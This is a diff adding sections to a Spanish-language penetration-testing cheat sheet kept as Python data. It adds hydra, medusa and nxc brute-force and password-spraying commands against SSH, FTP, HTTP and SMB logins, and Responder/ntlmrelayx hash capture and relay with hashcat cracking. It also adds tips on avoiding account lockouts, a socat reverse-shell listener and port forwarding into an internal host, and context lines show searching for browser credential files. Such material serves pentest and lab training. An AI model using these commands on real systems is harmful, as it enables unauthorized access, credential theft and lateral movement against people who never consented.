@@ -592,6 +592,26 @@ SECTIONS = [
                 "nxc winrm $IP -u $USER -p $PASS",
                 "ssh $USER@$IP",
             ]),
+            ("h2", "Fuerza bruta online a logins (hydra)"),
+            ("code", [
+                "hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP ssh",
+                "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://$IP",
+                "hydra -l admin -P rockyou.txt $IP http-post-form \"/login:user=^USER^&pass=^PASS^:F=Invalid\"",
+                "hydra -l admin -P rockyou.txt $IP http-get /admin/",
+                "medusa -h $IP -u admin -P rockyou.txt -M ssh",
+                "nxc smb $IP -u users.txt -p rockyou.txt --continue-on-success",
+            ]),
+            ("h2", "Capturar y relay de hashes de red (Responder)"),
+            ("code", [
+                "sudo responder -I tun0 -wv",
+                "impacket-ntlmrelayx -tf targets.txt -smb2support",
+                "hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt",
+            ]),
+            ("bullets", [
+                "Fuerza bruta http: dispara una vez, mira el mensaje de fallo real (F=...) y ajustalo, o hydra dara todo como valido.",
+                "Con muchos usuarios y una sola password (spraying) evitas bloqueos; muchas passwords por usuario los provoca.",
+                "Responder captura NetNTLMv2 (crackeable con -m 5600); si SMB signing esta off, mejor relay con ntlmrelayx.",
+            ]),
             ("h2", "Loot de navegadores y apps"),
             ("code", [
                 "find / \\( -name logins.json -o -name key4.db -o -name signons.sqlite \\) 2>/dev/null",
@@ -637,6 +657,11 @@ SECTIONS = [
                 "CTRL+Z",
                 "stty raw -echo; fg",
                 "export TERM=xterm",
+            ]),
+            ("h2", "socat: listener totalmente interactivo y redireccion"),
+            ("code", [
+                "socat file:`tty`,raw,echo=0 tcp-listen:4444",
+                "socat tcp-listen:8001,fork tcp:INTERNAL_IP:80",
             ]),
             ("h2", "Transferencia"),
             ("code", [
